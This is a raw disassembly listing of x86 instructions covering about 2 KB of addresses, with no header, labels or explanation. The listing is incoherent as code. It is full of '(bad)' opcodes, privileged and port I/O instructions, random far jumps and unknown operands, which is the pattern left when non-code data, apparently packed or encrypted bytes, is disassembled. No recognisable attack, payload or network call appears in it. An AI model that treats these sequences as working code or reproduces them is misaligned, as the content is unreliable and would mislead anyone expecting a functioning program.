  41123f:	or     eax,0x7a333908
  411244:	or     BYTE PTR [ebx],al
  411246:	dec    ecx
  411247:	cmp    BYTE PTR [eax+edi*1],bl
  41124a:	icebp  
  41124b:	push   edi
  41124c:	pop    es
  41124d:	retf   
  41124e:	push   edx
  41124f:	inc    esp
  411250:	stos   BYTE PTR es:[edi],al
  411251:	push   cs
  411252:	retf   
  411253:	add    ebp,DWORD PTR [ecx]
  411255:	stos   BYTE PTR es:[edi],al
  411256:	popa   
  411257:	fcmovbe st,st(0)
  411259:	adc    BYTE PTR [ebx],cl
  41125b:	sbb    eax,DWORD PTR [bx]
  41125e:	sbb    ebx,DWORD PTR [ebp-0x6a2c817f]
  411264:	cli    
  411265:	bound  edi,QWORD PTR [ebx+edx*4+0x62d464c1]
  41126c:	add    DWORD PTR [edx-0x5f],ecx
  41126f:	or     al,0x3b
  411271:	or     eax,0x3b973f79
  411276:	pop    esi
  411277:	add    ebx,eax
  411279:	xor    edi,DWORD PTR [esi+edi*8]
  41127c:	mov    bl,BYTE PTR [ebp-0x17b1cc35]
  411282:	popf   
  411283:	fadd   st(0),st
  411285:	hlt    
  411286:	push   edx
  411287:	lods   eax,DWORD PTR ds:[esi]
  411288:	fcomp  QWORD PTR [esi+edx*2+0x7376bfd3]
  41128f:	jo     0x411253
  411291:	dec    ebp
  411292:	mov    ds,esi
  411294:	ror    DWORD PTR ds:0xf95c9319,1
  41129a:	or     al,0xf1
  41129c:	mov    edi,0x4c6755d7
  4112a1:	add    ah,bl
  4112a3:	fstp   TBYTE PTR [ebx+0x15d95ed9]
  4112a9:	xor    ecx,DWORD PTR [ebx]
  4112ab:	or     ah,BYTE PTR [edi+edi*1]
  4112ae:	scas   al,BYTE PTR es:[edi]
  4112af:	xchg   ebx,eax
  4112b0:	and    eax,0xd412dc4
  4112b5:	daa    
  4112b6:	cs stc 
  4112b8:	mov    DWORD PTR [ecx],edx
  4112ba:	push   0x27a91fa8
  4112bf:	cmp    al,0x99
  4112c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112c2:	je     0x411255
  4112c4:	dec    edi
  4112c5:	pop    ebx
  4112c6:	and    eax,0x6d940297
  4112cb:	sahf   
  4112cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112cd:	jae    0x411339
  4112cf:	lods   al,BYTE PTR ds:[esi]
  4112d0:	test   DWORD PTR [eax+eax*4-0x1be82bd6],ebp
  4112d7:	out    0x33,al
  4112d9:	adc    eax,eax
  4112db:	lods   al,BYTE PTR ds:[esi]
  4112dc:	pop    ebx
  4112dd:	bound  edx,QWORD PTR [ebx-0x5f]
  4112e0:	jge    0x4112d4
  4112e2:	stos   BYTE PTR es:[edi],al
  4112e3:	jae    0x41129a
  4112e5:	retf   0x7771
  4112e8:	mov    ebp,0x1ec62da7
  4112ed:	repnz lods eax,DWORD PTR ds:[esi]
  4112ef:	scas   eax,DWORD PTR es:[edi]
  4112f0:	sbb    eax,0x5a7252eb
  4112f5:	cmc    
  4112f6:	pop    ecx
  4112f7:	dec    ebx
  4112f8:	xor    bl,BYTE PTR [ecx+0x6c]
  4112fb:	cld    
  4112fc:	push   esp
  4112fd:	jmp    0x4112cd
  4112ff:	pop    edx
  411300:	and    BYTE PTR [eax+ecx*1-0x757118c7],bh
  411307:	sub    eax,0x824b191b
  41130c:	outs   dx,BYTE PTR ds:[esi]
  41130d:	mov    DWORD PTR [ecx+0x60],ebp
  411310:	pop    ebp
  411311:	push   edi
  411312:	cmp    edx,DWORD PTR [ecx]
  411314:	pop    ds
  411315:	pop    ss
  411316:	xchg   ebp,eax
  411317:	enter  0xb47c,0x22
  41131b:	pop    ds
  41131c:	cwde   
  41131d:	sbb    ebp,DWORD PTR [eax+0x67]
  411320:	cmp    al,bl
  411322:	imul   BYTE PTR [ecx-0x73]
  411325:	addr16 push esp
  411327:	add    BYTE PTR [edx+0x40b8a342],0x92
  41132e:	movaps xmm6,xmm6
  411331:	sbb    dl,BYTE PTR [eax]
  411333:	pop    ebx
  411334:	sub    eax,0xfecfe076
  411339:	adc    DWORD PTR [edi],eax
  41133b:	lahf   
  41133c:	repnz cmp al,0xb5
  41133f:	aad    0x5e
  411341:	sbb    BYTE PTR [edi+eax*4-0x52],dh
  411345:	nop
  411346:	fucomi st,st(5)
  411348:	jbe    0x4113c6
  41134a:	and    DWORD PTR [ecx-0x216d822b],esi
  411350:	sbb    eax,0xae5f33a7
  411355:	inc    esi
  411356:	(bad)  
  411357:	mov    al,ds:0xf0c5cf96
  41135c:	ins    DWORD PTR es:[edi],dx
  41135d:	mov    bh,0xa1
  41135f:	sahf   
  411360:	cmp    bl,BYTE PTR [eax]
  411362:	test   ebp,ecx
  411364:	cs jne 0x411325
  411367:	jmp    0x411383
  411369:	adc    DWORD PTR [ecx-0x3fc9e134],eax
  41136f:	push   ecx
  411370:	inc    esp
  411371:	repnz and eax,0xbb992e1d
  411377:	in     eax,dx
  411378:	jae    0x411306
  41137a:	jnp    0x411390
  41137c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41137d:	test   eax,0xb3b4aaa0
  411382:	repnz mov eax,ds:0x89b5b0ad
  411388:	cdq    
  411389:	popf   
  41138a:	ret    
  41138b:	je     0x4113fc
  41138d:	sbb    DWORD PTR [eax+ebx*8],esp
  411390:	push   0x6438a8
  411395:	push   ebp
  411396:	and    dl,BYTE PTR ds:0x4fa2bae
  41139c:	dec    esp
  41139d:	pop    ds
  41139e:	loop   0x4113e2
  4113a0:	aam    0xcf
  4113a2:	or     ch,BYTE PTR [edi-0x3b]
  4113a5:	push   esp
  4113a6:	stos   DWORD PTR es:[edi],eax
  4113a7:	cli    
  4113a8:	clc    
  4113a9:	lahf   
  4113aa:	and    edx,esp
  4113ac:	ja     0x4113f4
  4113ae:	jnp    0x411421
  4113b0:	push   0x6f76ab62
  4113b5:	stos   DWORD PTR es:[edi],eax
  4113b6:	dec    esp
  4113b7:	xchg   BYTE PTR [ecx],dl
  4113b9:	pop    ebp
  4113ba:	sub    eax,0xdcd7f77d
  4113bf:	jg     0x41139b
  4113c1:	cmp    bl,0x48
  4113c4:	add    eax,0xeac654bb
  4113c9:	xchg   BYTE PTR [esi+0x54],ch
  4113cc:	imul   eax,DWORD PTR [edx+0x522c50ff],0x814f2167
  4113d6:	dec    esp
  4113d7:	mov    fs,WORD PTR [ecx-0x25]
  4113da:	push   edx
  4113db:	push   0x6f16be5e
  4113e0:	test   BYTE PTR [ebp-0x7a],ch
  4113e3:	xlat   BYTE PTR ds:[ebx]
  4113e4:	sbb    al,0x26
  4113e6:	outs   dx,BYTE PTR ds:[esi]
  4113e7:	and    DWORD PTR [ebx],eax
  4113e9:	lods   eax,DWORD PTR ds:[esi]
  4113ea:	icebp  
  4113eb:	or     DWORD PTR [ebx],esi
  4113ed:	fdivp  st(3),st
  4113ef:	in     al,0xaa
  4113f1:	scas   al,BYTE PTR es:[edi]
  4113f2:	push   edx
  4113f3:	sub    BYTE PTR [ebx-0x64],dl
  4113f6:	popa   
  4113f7:	mov    esp,0x9388aa19
  4113fc:	add    al,0x8c
  4113fe:	pop    edx
  4113ff:	jae    0x411392
  411401:	fdiv   DWORD PTR ds:0xa32e64e7
  411407:	call   0x4af22c35
  41140c:	popa   
  41140d:	int3   
  41140e:	jl     0x411420
  411410:	and    BYTE PTR [edi-0x14],bl
  411413:	int    0x9
  411415:	sub    ecx,DWORD PTR [ebp-0x40394d01]
  41141b:	xchg   ecx,eax
  41141c:	mov    esi,0x4298ebdf
  411421:	ins    BYTE PTR es:[edi],dx
  411422:	rcl    bh,cl
  411424:	ins    DWORD PTR es:[edi],dx
  411425:	addr16 dec ebx
  411427:	test   BYTE PTR [edi],cl
  411429:	inc    ecx
  41142a:	jmp    0xe1f714d9
  41142f:	inc    edi
  411430:	sbb    BYTE PTR [ebp-0x60],bh
  411433:	mov    ecx,0x835e852e
  411438:	into   
  411439:	pop    ebp
  41143a:	mov    ds:0x675be894,eax
  41143f:	and    bh,BYTE PTR [eax-0x4f]
  411442:	mov    al,0x97
  411444:	out    0xcf,al
  411446:	cwde   
  411447:	hlt    
  411448:	aas    
  411449:	mov    eax,ds:0x613d7651
  41144e:	sub    DWORD PTR [esi+0x5a91d987],eax
  411454:	retf   
  411455:	fdivr  DWORD PTR [ebx-0x49834b71]
  41145b:	pop    eax
  41145c:	inc    eax
  41145d:	fnstenv [ecx]
  41145f:	ins    DWORD PTR es:[edi],dx
  411460:	inc    edi
  411461:	(bad)  
  411462:	push   ebx
  411463:	xor    cl,BYTE PTR [edi]
  411465:	mov    es,WORD PTR [edx+0x36bcdb4a]
  41146b:	mov    ds:0x4e1f3de8,eax
  411470:	sbb    eax,DWORD PTR [esi]
  411472:	jmp    0x84693fa7
  411477:	mov    edx,0x72442ed5
  41147c:	dec    edx
  41147d:	xchg   esi,eax
  41147e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41147f:	cs loope 0x4114ee
  411482:	in     eax,dx
  411483:	div    DWORD PTR [ebx-0x45]
  411486:	lods   al,BYTE PTR ds:[esi]
  411487:	push   ds
  411488:	fst    DWORD PTR [edi]
  41148a:	adc    eax,0x1c
  41148d:	xlat   BYTE PTR ds:[ebx]
  41148e:	fidivr DWORD PTR [eax-0x13]
  411491:	xchg   ebx,eax
  411492:	mov    edx,0xe3f6b7dd
  411497:	add    eax,0x83495f21
  41149c:	jge    0x411495
  41149e:	repnz push esi
  4114a0:	adc    eax,0xed57084a
  4114a5:	sub    eax,0xd5ec5a6f
  4114aa:	add    bh,al
  4114ac:	icebp  
  4114ad:	sahf   
  4114ae:	pop    edx
  4114af:	push   ds
  4114b0:	fisttp WORD PTR [esi+0x44f7b393]
  4114b6:	out    0xbf,al
  4114b8:	addr16 xor eax,0x1133493d
  4114be:	pop    edi
  4114bf:	mov    esi,0xc4533520
  4114c4:	sahf   
  4114c5:	repz scas al,BYTE PTR es:[edi]
  4114c7:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114c9:	ins    DWORD PTR es:[edi],dx
  4114ca:	aaa    
  4114cb:	xchg   ebp,eax
  4114cc:	aas    
  4114cd:	imul   eax,DWORD PTR [ebp+0x18],0xbecb166c
  4114d4:	out    dx,eax
  4114d5:	and    ch,ch
  4114d7:	sbb    al,0x72
  4114d9:	arpl   WORD PTR [edi],si
  4114db:	adc    eax,0x30f4d108
  4114e0:	test   cl,dl
  4114e2:	mov    BYTE PTR [esi+0x1b7a9316],cl
  4114e8:	and    ebp,DWORD PTR [ebp-0x57]
  4114eb:	retf   
  4114ec:	aaa    
  4114ed:	xor    eax,0xd0f64f3b
  4114f2:	add    ecx,edi
  4114f4:	jo     0x411514
  4114f6:	call   0x85c20ff
  4114fb:	mul    bl
  4114fd:	mov    ds:0x43d5afc5,al
  411502:	call   0xbf82e22b
  411507:	mov    fs,ecx
  411509:	push   ecx
  41150a:	push   eax
  41150b:	mov    ds:0xe070bcf4,eax
  411510:	jnp    0x41152d
  411512:	jle    0x411550
  411514:	fdivr  DWORD PTR [esi+0x5d1f4dd4]
  41151a:	stc    
  41151b:	shl    edi,0x2d
  41151e:	mov    al,ds:0x87f3f7ba
  411523:	add    eax,0xef4e5f
  411528:	repz inc esp
  41152a:	ret    0xb4f
  41152d:	mov    ecx,0xbdb03ad2
  411532:	(bad)
  411536:	adc    ecx,DWORD PTR [edi+0xf7143ce]
  41153c:	sbb    cl,BYTE PTR [ecx-0x1e]
  41153f:	aas    
  411540:	ins    DWORD PTR es:[edi],dx
  411541:	add    al,0xc2
  411543:	sahf   
  411544:	or     ecx,DWORD PTR ds:0x95923359
  41154a:	dec    ebx
  41154b:	jno    0x4114d9
  41154d:	mov    ah,al
  41154f:	sub    DWORD PTR [edi+0x730604f],eax
  411555:	ja     0x41159b
  411557:	xchg   ebp,eax
  411558:	shl    BYTE PTR [edx+eax*1],1
  41155b:	repz inc ebx
  41155d:	leave  
  41155e:	xchg   ecx,eax
  41155f:	scas   eax,DWORD PTR es:[edi]
  411560:	push   0x7b
  411562:	les    edi,FWORD PTR [edi+edi*4+0x76]
  411566:	inc    eax
  411567:	call   0xdbf59ed0
  41156c:	pop    esp
  41156d:	test   al,0x7c
  41156f:	inc    ebp
  411570:	mov    ebx,0xb373dad0
  411575:	adc    ebx,DWORD PTR [edi+0x3f]
  411578:	mov    dl,0xe6
  41157a:	ret    0xcdca
  41157d:	(bad)  
  41157f:	repz sub DWORD PTR [ecx-0x16f1ac97],0xffffffab
  411587:	sahf   
  411588:	mov    cl,0x15
  41158a:	lods   eax,DWORD PTR ds:[esi]
  41158b:	adc    eax,0xd2e53dd6
  411590:	and    ebp,ecx
  411592:	mov    dh,0xe8
  411594:	fiadd  DWORD PTR [edi+0x25]
  411597:	data16 loope 0x4115fa
  41159a:	lods   al,BYTE PTR ds:[esi]
  41159b:	and    ebx,ebx
  41159d:	sti    
  41159e:	mov    bh,0xf0
  4115a0:	data16 pop dx
  4115a3:	fwait
  4115a4:	mov    ebp,0x9a75fa3f
  4115a9:	stos   DWORD PTR es:[edi],eax
  4115aa:	mov    esi,es
  4115ac:	es add ebx,0x1384d4b4
  4115b3:	aaa    
  4115b4:	or     DWORD PTR [edx+0x15ca0073],0xe34392a6
  4115be:	scas   eax,DWORD PTR es:[edi]
  4115bf:	inc    ebx
  4115c0:	or     edi,DWORD PTR [edi]
  4115c2:	repz push ebp
  4115c4:	mov    eax,0x81d5b3e9
  4115c9:	fcomp  DWORD PTR [ebx-0x2af115fc]
  4115cf:	jns    0x411559
  4115d1:	xchg   edi,eax
  4115d2:	cs inc ecx
  4115d4:	(bad)  
  4115d6:	cs aam 0x85
  4115d9:	mov    ah,0x13
  4115db:	and    esi,eax
  4115dd:	pop    ds
  4115de:	sahf   
  4115df:	pop    esi
  4115e0:	fsubr  DWORD PTR [esi-0x69]
  4115e3:	sbb    al,0xbc
  4115e5:	add    ch,al
  4115e7:	pop    eax
  4115e8:	in     al,0x4
  4115ea:	pop    esi
  4115eb:	jmp    0x4115a4
  4115ed:	add    eax,DWORD PTR [esi-0x1d]
  4115f0:	gs fwait
  4115f2:	inc    ebx
  4115f3:	mov    ecx,0xfca66fb0
  4115f8:	int    0x1a
  4115fa:	xor    eax,0xccb39142
  4115ff:	test   al,0x50
  411601:	push   esp
  411602:	dec    ecx
  411603:	leave  
  411604:	sbb    DWORD PTR [ebx-0x32c66ed],edi
  41160a:	cmp    BYTE PTR [ecx+ecx*4],0x52
  41160e:	dec    ebx
  41160f:	out    dx,eax
  411610:	js     0x4115ce
  411612:	imul   edi,DWORD PTR [eax+0x197916d],0xffffffc0
  411619:	mov    eax,0x9030278c
  41161e:	gs mov ecx,0xe3c436b7
  411624:	adc    BYTE PTR [ecx-0x3f0ab35a],bh
  41162a:	arpl   WORD PTR [ebp+0x17],bx
  41162d:	push   edx
  41162e:	and    bh,al
  411630:	pushf  
  411631:	and    BYTE PTR [ecx+eax*1-0x78a2a03b],ch
  411638:	aam    0x31
  41163a:	cmp    BYTE PTR [ecx],ch
  41163c:	mov    ch,0xe8
  41163e:	sahf   
  41163f:	mov    gs,WORD PTR [ebp-0x625c0ea7]
  411645:	add    esp,DWORD PTR [esi]
  411647:	loope  0x4116b3
  411649:	sub    DWORD PTR [edx],esi
  41164b:	sub    al,0xa6
  41164d:	add    ecx,DWORD PTR [eax-0x5c0e4384]
  411653:	rcl    dl,1
  411655:	push   edx
  411656:	gs (bad) 
  411658:	pop    edx
  411659:	inc    ecx
  41165a:	aad    0xaf
  41165c:	fisub  DWORD PTR [edi-0x3fbd8b9c]
  411662:	lahf   
  411663:	adc    dl,al
  411665:	push   ebp
  411666:	mov    DWORD PTR [ecx-0x45],ebp
  411669:	daa    
  41166a:	(bad)  [edi+0x15]
  41166d:	bound  esi,QWORD PTR [ebx-0x2f75523b]
  411673:	ret    0xc4c2
  411676:	pusha  
  411677:	test   BYTE PTR [edx+0x68b47c78],dh
  41167d:	out    0x18,al
  41167f:	push   ecx
  411680:	add    esp,DWORD PTR [esi-0x2bbc4c8c]
  411686:	pushf  
  411687:	(bad)  
  411688:	mov    ebx,0xa52d5084
  41168d:	or     DWORD PTR [ebx+0x69338d2b],esi
  411693:	(bad)  
  411694:	je     0x411709
  411696:	fbstp  TBYTE PTR [edx]
  411698:	pop    eax
  411699:	and    DWORD PTR [edi+0x1e052544],edx
  41169f:	mov    edx,0x9a902d45
  4116a4:	xchg   dh,dh
  4116a6:	xchg   edi,eax
  4116a7:	test   eax,0x4fc7fce1
  4116ac:	nop
  4116ad:	repnz shr DWORD PTR [eax+edi*8],0xe5
  4116b2:	xchg   ebx,eax
  4116b3:	test   eax,0x475c2a78
  4116b8:	xchg   BYTE PTR [esi],ah
  4116ba:	jnp    0x41163e
  4116bc:	mov    edi,0x3297d245
  4116c1:	jg     0x411677
  4116c3:	push   ebp
  4116c4:	xlat   BYTE PTR ds:[ebx]
  4116c5:	pop    ebx
  4116c6:	lods   eax,DWORD PTR ds:[esi]
  4116c7:	adc    ebp,eax
  4116c9:	mov    BYTE PTR [edx],ah
  4116cb:	jg     0x411694
  4116cd:	in     al,0xd4
  4116cf:	push   0xe8e4c826
  4116d4:	ins    BYTE PTR es:[edi],dx
  4116d5:	cmp    al,0x9b
  4116d7:	add    eax,0x638c78
  4116dc:	bound  edx,QWORD PTR ds:0x36bc4d57
  4116e2:	test   bl,bh
  4116e4:	jge    0x4116a5
  4116e6:	jns    0x4116c4
  4116e8:	xor    eax,DWORD PTR [edi]
  4116ea:	xchg   esp,esp
  4116ec:	lea    esp,[ebp+0x35373829]
  4116f2:	out    dx,al
  4116f3:	(bad)
  4116f6:	mov    dl,0x4a
  4116f8:	and    al,0xec
  4116fa:	and    ebx,DWORD PTR [esp+ebp*2-0x1]
  4116fe:	bound  ecx,QWORD PTR [ecx+0x161a24b3]
  411704:	add    dl,BYTE PTR [ecx]
  411706:	adc    DWORD PTR [ecx],0x8bea2fc0
  41170c:	jge    0x41169b
  41170e:	scas   eax,DWORD PTR es:[edi]
  41170f:	mov    dh,0x42
  411711:	aaa    
  411712:	pop    edx
  411713:	jae    0x411775
  411715:	mov    ebp,0x47d69cf6
  41171a:	inc    esp
  41171b:	jns    0x41175f
  41171d:	xchg   edx,eax
  41171e:	data16 retw 
  411721:	(bad)  
  411723:	popf   
  411724:	pop    esp
  411725:	scas   eax,DWORD PTR es:[edi]
  411726:	xchg   ebx,eax
  411727:	idiv   BYTE PTR [ebp-0x4b]
  41172a:	stc    
  41172b:	jmp    0xb833:0xf77deb7a
  411732:	jne    0x411762
  411734:	dec    bh
  411736:	inc    edx
  411737:	or     DWORD PTR [ecx],ebp
  411739:	cld    
  41173a:	popw   ss
  41173c:	shl    DWORD PTR [esp+edi*4-0xb6ba23a],0x68
  411744:	push   ebx
  411745:	inc    ebp
  411746:	(bad)  
  411748:	cmc    
  411749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41174a:	push   edx
  41174b:	pop    DWORD PTR [edi+0x6b]
  41174e:	dec    esi
  41174f:	mov    ?,ecx
  411751:	xlat   BYTE PTR ds:[ebx]
  411752:	lock out dx,eax
  411754:	add    cl,BYTE PTR [edx+0x5d8c50bb]
  41175a:	push   ecx
  41175b:	stos   DWORD PTR es:[edi],eax
  41175c:	mov    BYTE PTR [edi-0x24],bl
  41175f:	adc    ecx,ecx
  411761:	hlt    
  411762:	inc    esp
  411763:	bound  edx,QWORD PTR [esi-0x58]
  411766:	xchg   ebx,eax
  411767:	push   cs
  411768:	inc    esi
  411769:	pusha  
  41176a:	dec    ecx
  41176b:	adc    DWORD PTR [ebp+0x1a],ebx
  41176e:	sub    eax,0x9301a9b
  411773:	inc    eax
  411774:	or     eax,0xd08532d0
  411779:	stos   DWORD PTR es:[edi],eax
  41177a:	jb     0x411724
  41177c:	sub    DWORD PTR [ebx-0x27521528],edi
  411782:	mov    al,BYTE PTR [ebp-0x654a0308]
  411788:	and    al,0x76
  41178a:	pop    eax
  41178b:	enter  0x75be,0xec
  41178f:	jmp    0x15b5:0x549bd0c3
  411796:	shr    BYTE PTR [edx],cl
  411798:	dec    eax
  411799:	push   edi
  41179a:	inc    edi
  41179b:	rol    edi,0x3f
  41179e:	push   ebp
  41179f:	shl    DWORD PTR [ebp+0x7bcc7f02],cl
  4117a5:	push   0x258b173c
  4117aa:	dec    ebp
  4117ab:	fidivr WORD PTR [edx+0x43]
  4117ae:	mov    al,0xa9
  4117b0:	sbb    al,0x89
  4117b2:	xchg   ecx,eax
  4117b3:	inc    ebx
  4117b4:	lock xchg edi,eax
  4117b6:	or     ebp,DWORD PTR [edi]
  4117b8:	jno    0x4117bb
  4117ba:	into   
  4117bb:	xlat   BYTE PTR ds:[ebx]
  4117bc:	mov    eax,ds:0xa428dc69
  4117c1:	sub    esp,esi
  4117c3:	mov    WORD PTR [ecx],ss
  4117c5:	jmp    0x3b04:0xf9d283c4
  4117cc:	retf   0x676d
  4117cf:	and    BYTE PTR [ebx+0x6e],0x30
  4117d3:	imul   eax,DWORD PTR [ebx+0x79],0x993e6b4b
  4117da:	xchg   DWORD PTR [edx+0x755c0633],ecx
  4117e0:	jmp    edx
  4117e2:	test   eax,0x7ed0ea47
  4117e7:	xchg   ebp,eax
  4117e8:	jae    0x411837
  4117ea:	fldenv [ebp-0x53651ac8]
  4117f0:	pop    es
  4117f1:	sahf   
  4117f2:	jbe    0x411790
  4117f4:	popa   
  4117f5:	jmp    0x1c7:0xb8501abc
  4117fc:	daa    
  4117fd:	outs   dx,BYTE PTR ds:[esi]
  4117fe:	scas   eax,DWORD PTR es:[edi]
  4117ff:	pop    eax
  411800:	xor    ch,BYTE PTR [edx-0xd8c98b6]
  411806:	out    dx,al
  411807:	push   eax
  411808:	cli    
  411809:	mov    ecx,0xd2770158
  41180e:	add    ebx,DWORD PTR [ecx-0x4dda35f4]
  411814:	jmp    0xe3bd:0xb1a43061
  41181b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41181c:	lods   al,BYTE PTR ds:[esi]
  41181d:	aas    
  41181e:	mov    dh,0xdc
  411820:	repz (bad) 
  411822:	pop    ss
  411823:	clc    
  411824:	jle    0x411850
  411826:	or     BYTE PTR [eax+0x19],0xc4
  41182a:	mov    dl,BYTE PTR [eax-0x3dd14e88]
  411830:	cmp    DWORD PTR [ebp-0x2b58c80a],esp
  411836:	cmp    al,0x71
  411838:	mov    ds:0x63263b1d,eax
  41183d:	(bad)  
  41183e:	mov    ebp,0x1e4e711f
  411843:	fisttp DWORD PTR [eax+0x68ea5ae1]
  411849:	or     BYTE PTR [esi-0x6a],ch
  41184c:	or     eax,0xdfd08a27
  411851:	cwde   
  411852:	sub    dh,BYTE PTR [eax]
  411854:	sub    DWORD PTR [eax-0x65],edi
  411857:	sub    esi,edi
  411859:	xlat   BYTE PTR ds:[ebx]
  41185a:	bound  ebx,QWORD PTR [edi+0x6c4c061a]
  411860:	or     al,0x83
  411862:	or     eax,eax
  411864:	pop    ecx
  411865:	loop   0x4117ea
  411867:	xchg   DWORD PTR [edi+0x6b],edi
  41186a:	sub    eax,0x798d1b68
  41186f:	push   edi
  411870:	ja     0x41184e
  411872:	adc    eax,0xd120a486
  411877:	fs add ax,0x1656
  41187c:	jg     0x411836
  41187e:	es xor BYTE PTR cs:[ecx+ecx*4-0x6f],0x4d
  411885:	sbb    eax,0x4a14fc55
  41188b:	mov    WORD PTR [ebp+ebx*2-0x50e5a166],fs
  411892:	jmp    0x411854
  411894:	in     al,dx
  411895:	(bad)  
  411896:	fldcw  WORD PTR [edx+0x4f]
  411899:	mov    bl,0x41
  41189b:	mov    ebp,0x3792799e
  4118a0:	ds addr16 int 0x92
  4118a4:	pop    ebp
  4118a5:	fs pop esi
  4118a7:	jns    0x41187e
  4118a9:	cmp    al,0x7
  4118ab:	stos   BYTE PTR es:[edi],al
  4118ac:	sub    al,0xf9
  4118ae:	xlat   BYTE PTR ds:[ebx]
  4118af:	adc    eax,0x31979095
  4118b4:	mov    cl,0x91
  4118b6:	xchg   BYTE PTR [ebx+0x62],bh
  4118b9:	xchg   edi,eax
  4118ba:	inc    esi
  4118bb:	into   
  4118bc:	push   ds
  4118bd:	icebp  
  4118be:	leave  
  4118bf:	imul   ebp,DWORD PTR [ecx+ebp*1-0x3edeef5a],0x5694aca
  4118ca:	icebp  
  4118cb:	and    DWORD PTR ds:0x640d0afa,esi
  4118d1:	adc    edi,DWORD PTR [esi-0x6]
  4118d4:	dec    edx
  4118d5:	data16 loop 0x4118b8
  4118d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118d9:	xchg   BYTE PTR [ebp-0x517cd15d],bl
  4118df:	push   ss
  4118e0:	cmp    eax,0xa434432c
  4118e5:	xlat   BYTE PTR ds:[ebx]
  4118e6:	sti    
  4118e7:	or     cl,bl
  4118e9:	data16 add BYTE PTR [edi+ebp*4+0x16],ch
  4118ee:	pop    ds
  4118ef:	shr    bl,1
  4118f1:	test   BYTE PTR [eax],bl
  4118f3:	pop    ss
  4118f4:	outs   dx,BYTE PTR ds:[esi]
  4118f5:	mov    esp,0xd912220c
  4118fa:	cmp    BYTE PTR [edx],al
  4118fc:	jmp    DWORD PTR [edx-0x17c81c78]
  411902:	ret    0x7fad
  411905:	popf   
  411906:	jo     0x41197b
  411908:	jb     0x41193f
  41190a:	xchg   ebx,eax
  41190b:	inc    eax
  41190c:	lods   eax,DWORD PTR ds:[esi]
  41190d:	(bad)  
  41190e:	call   0xb1dae18a
  411913:	pop    ds
  411914:	call   0x4353:0xb777feee
  41191b:	fstp   QWORD PTR [ebx]
  41191d:	mov    eax,ds:0xaab5e492
  411922:	into   
  411923:	(bad)  
  411924:	lock rcl BYTE PTR [edi-0x41],1
  411928:	sub    edi,esi
  41192a:	dec    ebp
  41192b:	add    eax,0x289f954
  411930:	inc    eax
  411931:	aas    
  411932:	push   edi
  411933:	xlat   BYTE PTR ds:[ebx]
  411934:	adc    ah,BYTE PTR [eax-0x2d]
  411937:	mov    al,0x8f
  411939:	or     al,0x42
  41193b:	fild   QWORD PTR [ebx+0x10]
  41193e:	mov    eax,ds:0xe85a1277
  411943:	cmp    ecx,edx
  411945:	fistp  WORD PTR [esi+edi*2]
  411948:	pop    esi
  411949:	neg    esp
  41194b:	mov    ch,BYTE PTR [ecx+0xd]
  41194e:	addr16 cli 
  411950:	mov    al,0x92
  411952:	pop    ebp
  411953:	xor    al,0x62
  411955:	xor    BYTE PTR [eax],0x14
  411958:	mov    ebp,0x8b85bb6e
  41195d:	cld    
  41195e:	fnsave ss:[edi]
  411961:	mov    BYTE PTR [edx+ecx*4],bh
  411964:	jp     0x4119e2
  411966:	(bad)  
  411967:	sbb    DWORD PTR [ebp+0x42d85457],esp
  41196d:	mov    ebx,0xb8d7b218
  411972:	xchg   ecx,eax
  411973:	fsubr  st(2),st
  411975:	inc    eax
  411976:	sar    BYTE PTR [edi+0x51],0x51
  41197a:	xchg   BYTE PTR [ecx-0x150b809],dh
  411980:	fs lahf 
  411982:	stos   BYTE PTR es:[edi],al
  411983:	rcl    DWORD PTR [edx+0x776d9b67],cl
  411989:	aas    
  41198a:	or     al,0xe1
  41198c:	aad    0x5f
  41198e:	(bad)
  411992:	push   0xffffffe3
  411994:	mov    bh,0xdc
  411996:	jp     0x41196c
  411998:	imul   ebx,DWORD PTR [ecx+0x4a062d85],0xffffffaa
  41199f:	retf   
  4119a0:	mov    WORD PTR [edi-0x2a],?
  4119a3:	lahf   
  4119a4:	pop    ds
  4119a5:	sbb    eax,0x7a9789c4
  4119aa:	pop    eax
  4119ab:	pop    ss
  4119ac:	sti    
  4119ad:	inc    BYTE PTR [edx-0x71ddf94d]
  4119b3:	rcr    DWORD PTR [ebx+0x220804e5],0x9a
  4119ba:	sub    eax,0x5c83de40
  4119bf:	jle    0x411a26
  4119c1:	fiadd  DWORD PTR [eax-0x671343ec]
  4119c7:	ja     0x4119c0
  4119c9:	ds inc ebp
  4119cb:	clc    
  4119cc:	out    dx,eax
  4119cd:	icebp  
  4119ce:	sub    esp,DWORD PTR [esi+0x3a]
  4119d1:	je     0x411a4a
  4119d3:	xchg   esi,eax
  4119d4:	mov    eax,ds:0xd0c37e4f
  4119d9:	mov    cl,0x4f
  4119db:	ror    ch,0x20
  4119de:	mov    ds,WORD PTR [ebp-0x55815706]
  4119e4:	mov    ds:0xc872076,al
  4119e9:	adc    DWORD PTR [edi+0x4e54b17c],esp
  4119ef:	test   BYTE PTR [esi],al
  4119f1:	pop    ss
  4119f2:	lock cli 
  4119f4:	cwde   
  4119f5:	pop    ecx
  4119f6:	push   cs
  4119f7:	mov    dh,0xc5
  4119f9:	pop    edx
  4119fa:	sbb    eax,0x23bdf2b6
  4119ff:	fisubr WORD PTR [ebx+0x2f]
  411a02:	ja     0x4119d8
  411a04:	repz sti 
  411a06:	and    al,0xca
  411a08:	icebp  
  411a09:	nop
  411a0a:	icebp  
  411a0b:	or     edx,DWORD PTR [edx+0x7b]
  411a0e:	jg     0x411a61
  411a10:	or     BYTE PTR [eax-0x170bf73a],dh
  411a16:	pop    DWORD PTR [ecx-0x2b]
  411a19:	cmp    al,0x56
  411a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a1c:	mov    edi,0x15b0691e
  411a21:	lahf   
  411a22:	mov    esi,0xd459bba8
  411a27:	cmp    al,0x75
  411a29:	adc    dl,BYTE PTR [ecx-0x138cdc63]
  411a2f:	xor    BYTE PTR [ebx+0x30e8e485],cl
  411a35:	jg     0x411a4b
  411a37:	inc    eax
  411a38:	push   ebx
  411a39:	jmp    0x88f95a10
  411a3e:	fwait
  411a3f:	test   DWORD PTR [ecx],ebp
